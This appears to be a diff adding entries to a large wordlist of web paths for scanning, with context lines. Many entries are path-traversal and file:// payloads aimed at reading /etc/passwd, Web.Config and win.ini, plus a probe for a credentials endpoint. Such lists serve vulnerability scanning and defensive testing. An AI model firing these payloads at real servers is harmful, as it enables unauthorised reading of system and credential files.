@@ -50292,3 +50292,11 @@ http://ifconfig.me/
 /api/BetterImageGallery/imagehandler?path=../../../Web.Config
 /wp-content/plugins/user-meta/views/debug.php
 /filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
+/static/nbextensions/
+/html?url=file:///etc/passwd
+/mailinspector/public/loader.php?path=../../../../../../../etc/passwd
+/API/V1/credentials
+/api/get-browser-snapshot?snapshot_path=../../../../etc/passwd
+/windows/win.ini
+/static/etc/passwd
+/dolphinscheduler/resources/download?fullName=file:///etc/passwd
